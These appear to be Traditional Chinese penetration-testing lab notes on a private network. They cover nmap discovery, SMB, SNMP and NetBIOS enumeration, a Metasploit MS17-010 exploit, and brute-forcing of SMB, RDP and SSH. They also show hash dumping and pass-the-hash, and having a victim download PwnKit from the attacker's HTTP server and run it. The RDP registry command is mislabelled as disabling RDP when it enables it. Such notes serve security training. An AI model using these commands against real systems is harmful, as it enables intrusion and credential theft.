Day1
===
Host Discovery: IP (arp, icmp, 25, 80, 445, 3389)
---
    sudo nmap –n –sn –PS22,80,445,3389 192.168.0.* –oG - |grep Up | cut –d" " –f2 > iplist
    利用常見的連接埠探測機器是否有開啟這些連接埠
<img  alt="image" src="https://github.com/user-attachments/assets/20801a33-6b66-4cc0-b612-f9983fd3ae7b">

**補充**

1.nmap預設只掃1000常用的連接埠
            
2.nmap沒有權限只會進行TCP connect scan只能掃80、443，若要完整的掃描開放端口需加sudo，因要進行SYN掃描要創建數據包，root權限才能創建

    若環境無法安裝nmap可以利用迴圈
    for i in {1..254}; do (ping -c 1 192.168.0.$i | grep "bytes from" &); done
<img  alt="image" src="https://github.com/user-attachments/assets/b5b183ea-2680-48be-bdd7-b5c513864579">

    UDP Scan 可清楚看到137有回應，138可能有開但被過濾,139完全沒有回應

<img alt="image" src="https://github.com/user-attachments/assets/73263ac5-23e4-4f12-82d8-10c4e4fd1e16">

    sudo hping3 192.168.0.7 -n -S -c 3 -p 80，利用hping發送封包

<img  alt="image" src="https://github.com/user-attachments/assets/596f3f6f-44cc-4d4c-871d-62e507fe2501">

Service/OS Discovery
---
        
    sudo nmap -n -p445,3389 -sVC 192.168.0.21，發現此台主機有開啟smb v1
<img alt="image" src="https://github.com/user-attachments/assets/c6494a73-cc45-4c6b-aa4c-b005a88a254e">

    sudo nmap -n --script=smb-vuln-ms17-010.nse 192.168.0.21 使用nmap上的腳本進行scan
<img alt="image" src="https://github.com/user-attachments/assets/2950f88e-461c-4a1c-ad3d-08a04613a8cc">

Initial Access - Exploit MS17_010
---

    msfconsole -q 執行metasploit
    search ms17_010

<img alt="image" src="https://github.com/user-attachments/assets/6ad42976-a471-4f71-b7b2-4964d0f2f2f7">

    use 2
<img  alt="image" src="https://github.com/user-attachments/assets/46192082-9fcc-437f-bdfe-37eeb45a7ca2">

    show options

<img  alt="image" src="https://github.com/user-attachments/assets/9b8530f0-dfb7-4b49-9a34-1ee8a7d78329">

    set rhost 192.168.0.21
    set lhost 192.168.0.18
    run
<img  alt="image" src="https://github.com/user-attachments/assets/cc831b10-7387-4047-a2bd-33993b9dd238">

    成功打進去192.168.0.21
<img  alt="image" src="https://github.com/user-attachments/assets/d5bb80d8-953f-4724-a11a-a64047a7b9d9">

ENUM SNMP - UDP 161
---
    sudo nmap -n -p161 -sU --open 192.168.0.* -oG - | grep Up | cut -d' ' -f2 > snmp_ip.txt
<img  alt="image" src="https://github.com/user-attachments/assets/876c4d64-92e6-448b-ae50-b71cccd310d7">

    使用onesixtyone -i snmp_ips.txt public驗證是否有使用SNMP服務
<img  alt="image" src="https://github.com/user-attachments/assets/8af77a23-0854-4611-90d5-22037f5c6d19">

    snmp-check 192.168.0.20 取得該電腦的資訊並蒐集
<img  alt="image" src="https://github.com/user-attachments/assets/4887d1fb-b79a-482f-8365-158ee5bd5671">

    sudo nmap -n -p161 -sU --script snmp-win32-users 192.168.0.20 取得帳號資訊
<img alt="image" src="https://github.com/user-attachments/assets/0645da01-62b8-49f9-b53b-4b6487049b1c">

NetBIOS over TCP/IP (NetBT)
---
    NetBIOS資訊蒐集 sudo nbtscan -r 192.168.0.0/24
<img  alt="image" src="https://github.com/user-attachments/assets/b47de249-1aaf-4b3d-ae3d-5f5ec154eed5">

    nbtstat -n 
    nbtstat -a <Name>
    nbtstat -A <IP>
<img alt="image" src="https://github.com/user-attachments/assets/6ca63c07-b9c3-41e4-9cd0-43bf73691450">

**補充**

    NetBIOS Suffix 補充：
        NetBIOS Suffix 是用於識別NetBIOS名稱類型的1個字符代碼。以下是一些常見的NetBIOS Suffix以及它們的含義：
    Unique names：
        00: 表示Workstation服務。這種名稱通常用於識別個人計算機或工作站。
        03: 表示Messenger服務。這種名稱用於支持Windows的網絡消息功能。
        06: 表示RAS服務。這種名稱用於支持遠程訪問服務。
        1B: 表示Domain Master Browser服務。這種名稱通常用於識別網絡中的主瀏覽器。
        1D: 表示Master Browser服務。這種名稱通常用於識別工作組中的主瀏覽器。
        20: 表示File Server服務。這種名稱通常用於識別檔案伺服器。
        21: 表示RDBSS。這種名稱通常用於識別Windows Redirector，用於訪問遠程共享資源。
    Group names：
        00: 工作站服務（工作組/域名稱）
        1C: 表示Domain Controllers。這種名稱通常用於識別域控制器。
        1E: 表示瀏覽器服務（Browser Service Elections）。這種名稱通常用於瀏覽器選舉，以確定網絡中的主瀏覽器。
-------------------------------------------------------------------------------------------------------    
    net view
    net view /domain
    net view /domain:workgroup
    net view \\192.168.0.7
-------------------------------------------------------------------------------------------------------
    enum4linux 192.168.0.20
<img  alt="image" src="https://github.com/user-attachments/assets/3c346fae-83b8-4165-93f2-02e28f22db68">

CIFS / SMB - TCP 139,445
---
    sudo nmap -p445 -sVC  192.168.0.20
<img alt="image" src="https://github.com/user-attachments/assets/76c30c5e-69be-42ae-826d-1f104c0f411d">

    sudo nmap --script smb-os-discovery,smb-protocols
<img  alt="image" src="https://github.com/user-attachments/assets/30de62a4-dd77-4391-989c-26ca2b44b01a">

    impacket Version > 0.9.23
<img width="285" alt="image" src="https://github.com/user-attachments/assets/84866f67-e756-413f-bc5c-14909e7e9b7b">

    更新版本
<img  alt="image" src="https://github.com/user-attachments/assets/64b6e446-092e-4ed8-80b9-cf1fcacd20b3">

    暴力破解crackmapexec smb <smb_IP> -u <users.txt> -p <password.txt>
<img  alt="image" src="https://github.com/user-attachments/assets/a04beb33-4191-4435-8823-0e65c879b74d">

    利用爆破拿到的帳密執行winexe winexe –U 'Username%Password' //<IP> cmd.exe
<img alt="image" src="https://github.com/user-attachments/assets/3fb9e8d6-69ae-400a-b713-0754621ee0e6">

    secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.21 取得密碼HASH
<img width="506" alt="image" src="https://github.com/user-attachments/assets/75476e40-c987-4da6-b6ff-a87a1f2e7ee1">

    執行pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
<img  alt="image" src="https://github.com/user-attachments/assets/ea5804da-21b6-495e-aec5-2bc6f6b79c97">

RDP - TCP 3389
---
    freerdp Version > 2.3
    freerdp2-x11
    libfreerdp2-2
    libfreerdp-client2-2
    sudo dpkg –l | grep freerdp
<img  alt="image" src="https://github.com/user-attachments/assets/9798b42a-0db9-43c3-928e-f1528f51da64">

    暴力破解工具crowbar
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 823BF07CEB5C469B
    sudo apt install –y crowbar 
    crowbar [-v] –b rdp –s <IP/CIDR> –u user –c password
    crowbar [-v] –b rdp –s <IP/CIDR> –U Users.txt –C Passwords.txt

    xfreerdp遠端桌面工具
    xfreerdp /size:90% /v:<rdp_IP> /u:<user> /p:<password>
    xfreerdp /size:90% /v:<rdp_IP> /u:<user> /pth:<ntlm_hash>
<img alt="image" src="https://github.com/user-attachments/assets/c0f84645-6d65-4bd5-af98-4ab6844a165c">

    關閉遠端桌面
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
<img  alt="image" src="https://github.com/user-attachments/assets/7dc0850f-419a-4d06-bf35-c5ae7f37d432">

SSH
---
    msfconsole -q
    search ssh_enum
    use 1
<img width="507" alt="image" src="https://github.com/user-attachments/assets/a8212496-ec9d-49d2-b980-7c914dad5202">

    set rhost 192.168.0.70
    set user_file Wordlist/Username.txt
    set check_false true
    run
<img alt="image" src="https://github.com/user-attachments/assets/38fe0043-1516-4839-9ac1-beb849d7eb02">

    利用找到的帳號進行hydra暴力破解
    hydra –t 4 –l <username> –P <passwords.txt> ssh://<ssh_IP>
    hydra –t 4 –L <users.txt> –P <passwords.txt> ssh://<ssh_IP>
<img  alt="image" src="https://github.com/user-attachments/assets/68084110-d289-425f-8b37-7c078aece794">

Privilege Escalation
---
    PwnKit   
    https://github.com/ly4k/PwnKit
    wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
    wget https://github.com/ly4k/PwnKit/raw/main/PwnKit32
<img  alt="image" src="https://github.com/user-attachments/assets/e6613472-d269-4d99-8a52-06cb8a0438db">

    上傳PwnKit到受害端並執行，本機架設httpserver
    sudo python3 -m http.server 80
<img  alt="image" src="https://github.com/user-attachments/assets/770f3a07-48ef-4f0a-81ba-287f74a87189">

    受害端主機wget 192.168.0.18/PwnKit
<img  alt="image" src="https://github.com/user-attachments/assets/dd0f93d0-2220-4de2-a574-2d31e215d86a">
<img  alt="image" src="https://github.com/user-attachments/assets/cdfe2aa2-c495-4b2a-9cea-3503c4ae694b">

    變更檔案的執行權限並執行
    chmod +x PwnKit
    ./PwnKit
<img  alt="image" src="https://github.com/user-attachments/assets/59f26233-3db6-40c3-bad7-3b7751b2592e">

Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)
---
   
    檢查kernal版本是否在漏洞版本區間
![image](https://github.com/user-attachments/assets/200647a6-0081-45d5-a602-9848582b8d3b)

